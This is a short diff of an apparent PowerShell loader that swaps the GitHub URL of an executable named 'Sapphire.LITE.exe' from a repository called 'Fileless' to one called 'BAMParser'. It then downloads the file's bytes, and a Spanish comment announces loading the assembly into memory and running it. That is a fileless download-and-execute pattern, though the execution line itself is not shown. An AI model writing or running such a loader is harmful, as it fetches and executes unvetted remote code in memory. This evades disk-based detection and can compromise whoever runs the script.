@@ -1,4 +1,4 @@
-$url = "https://github.com/AL4AROX/Fileless/raw/refs/heads/main/Sapphire.LITE.exe"
+$url = "https://github.com/AL4AROX/BAMParser/raw/refs/heads/main/Sapphire.LITE.exe"
 $exeBytes = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
 
 # Cargar el ensamblado en memoria y ejecutar
